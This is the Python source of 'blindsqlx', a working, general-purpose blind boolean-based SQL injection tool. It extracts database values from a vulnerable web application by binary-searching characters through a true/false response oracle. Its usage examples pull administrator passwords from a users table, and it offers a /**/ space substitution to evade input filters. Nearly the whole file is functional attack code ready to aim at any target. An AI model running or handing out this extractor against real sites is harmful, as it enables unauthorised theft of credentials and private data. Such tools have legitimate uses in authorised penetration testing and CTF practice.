#!/usr/bin/env python3
"""
blindsqlx -- a small, generic blind boolean-based SQL injection extractor.

Unlike a one-off exploit script written against a single app, this takes
a request *template* with an INJECT marker, a string that only appears
when the injected condition is true, and extracts any scalar SQL
expression you give it -- character by character, via binary search.

It does not find injection points for you, and it does not do
UNION-based or time-based extraction. It does one thing: turn a known
boolean oracle into a data extractor, against whatever app you point it
at.

Usage:
  blindsqlx.py -u URL -X POST -d "username=INJECT&password=x" \\
      --true-marker "Welcome back" \\
      --expr "SELECT password FROM users WHERE username='administrator'"

  blindsqlx.py -u "http://target/item?id=INJECT" -X GET \\
      --true-marker "In stock" --false-marker "Not found" \\
      --expr "SELECT value FROM secrets WHERE label='root_flag'"
"""

import argparse
import sys

import requests

INJECT_MARKER = "INJECT"


def build_oracle(args):
    """Returns a function(boolean_sql_expr) -> bool."""

    def oracle(expr: str) -> bool:
        payload = args.prefix + expr + args.suffix
        if args.collapse_spaces:
            payload = payload.replace(" ", "/**/")

        url = args.url.replace(INJECT_MARKER, requests.utils.quote(payload, safe=""))
        data = None
        if args.data is not None:
            # INJECT marker in form data is substituted raw; requests
            # handles URL-encoding of the whole body for us.
            raw = args.data.replace(INJECT_MARKER, payload)
            data = dict(
                pair.split("=", 1) for pair in raw.split("&") if "=" in pair
            )

        resp = requests.request(
            args.method,
            url,
            data=data,
            timeout=args.timeout,
        )

        if args.true_marker:
            return args.true_marker in resp.text
        else:
            # if only a false-marker is given, true = marker absent
            return args.false_marker not in resp.text

    return oracle


def extract_string(oracle, select_expr: str, max_len: int, verbose: bool) -> str:
    length = 0
    for candidate_len in range(1, max_len + 1):
        if oracle(f"length(({select_expr}))={candidate_len}"):
            length = candidate_len
            break
    if length == 0:
        raise RuntimeError(
            f"Could not determine string length within max-len={max_len}. "
            f"Try increasing --max-len, or check your true/false markers."
        )

    if verbose:
        print(f"[*] length = {length}", file=sys.stderr)

    result = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126  # printable ASCII
        while lo < hi:
            mid = (lo + hi) // 2
            expr = f"unicode(substr(({select_expr}),{pos},1))<={mid}"
            if oracle(expr):
                hi = mid
            else:
                lo = mid + 1
        result += chr(lo)
        if verbose:
            print(f"  [{pos}/{length}] -> {result}", end="\r", file=sys.stderr, flush=True)
    if verbose:
        print(file=sys.stderr)
    return result


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True, help="Target URL. Must contain the literal marker 'INJECT'.")
    p.add_argument("-X", "--method", default="GET", choices=["GET", "POST"])
    p.add_argument("-d", "--data", default=None, help="Form body (application/x-www-form-urlencoded). Must contain 'INJECT'.")
    p.add_argument("--true-marker", default=None, help="Substring present in the response only when the condition is TRUE.")
    p.add_argument("--false-marker", default=None, help="Substring present only when the condition is FALSE (alternative to --true-marker).")
    p.add_argument("--expr", required=True, help="Scalar SQL expression to extract, e.g. \"SELECT password FROM users WHERE username='admin'\"")
    p.add_argument("--prefix", default="", help="Text inserted before your boolean expression in the payload, e.g. \"x' OR (\"")
    p.add_argument("--suffix", default="", help="Text inserted after your boolean expression, e.g. \") OR 'a'='b\"")
    p.add_argument("--collapse-spaces", action="store_true", help="Replace spaces in the payload with /**/ (bypass naive space filters).")
    p.add_argument("--max-len", type=int, default=200, help="Maximum string length to search for (default 200).")
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    if not args.true_marker and not args.false_marker:
        p.error("one of --true-marker or --false-marker is required")
    if INJECT_MARKER not in args.url and (args.data is None or INJECT_MARKER not in args.data):
        p.error(f"the literal marker '{INJECT_MARKER}' must appear in --url or --data")

    oracle = build_oracle(args)
    result = extract_string(oracle, args.expr, args.max_len, args.verbose)
    print(result)


if __name__ == "__main__":
    main()
